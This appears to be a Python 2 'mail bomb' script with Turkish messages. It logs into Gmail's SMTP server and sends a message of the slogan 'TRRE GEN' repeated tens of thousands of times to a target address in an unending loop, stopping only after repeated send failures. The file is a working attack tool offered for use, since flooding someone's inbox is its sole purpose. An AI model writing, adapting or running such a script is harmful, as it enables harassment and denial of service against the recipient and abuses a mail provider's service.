import smtplib
import sys
import os
import time
############################################################degiskenler###############################################
say = 0
dene = 0
mail = ""
pa = ""



mesajim = "$TRRE GEN$ $TRRE GEN$ $TRRE GEN$ $TRRE GEN$\n" * 99999


os.system("clear")
os.system("figlet -c 'TRRE GEN'")
print "[*] Trre gen mail bomb script v1\n[*] Gurula Sunar......"
time.sleep(3.2)
try:
	target = sys.argv[1]
except:
	target = raw_input("The Mail : ->> ")
try:
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(mail, pa)
	except:
		print "Giris Yapilamadi..."
		exit()
	print "[*] atack basliyor..."
	while True:
		try:
			server.sendmail(mail, target, mesajim)
			say += 1
			print "[+] sended... : " + str(say)
		except:
			dene += 1
			print "[-] Not sended"
			if dene == 5:
				server.close()
				break
except:
	print "[!] Network Error...Exiting."


if say > 0:
	print "[+] " + target + " adresine " + str(say) + " kadar Mail atildi\n"
	so = raw_input("[+] islem tamam...!")
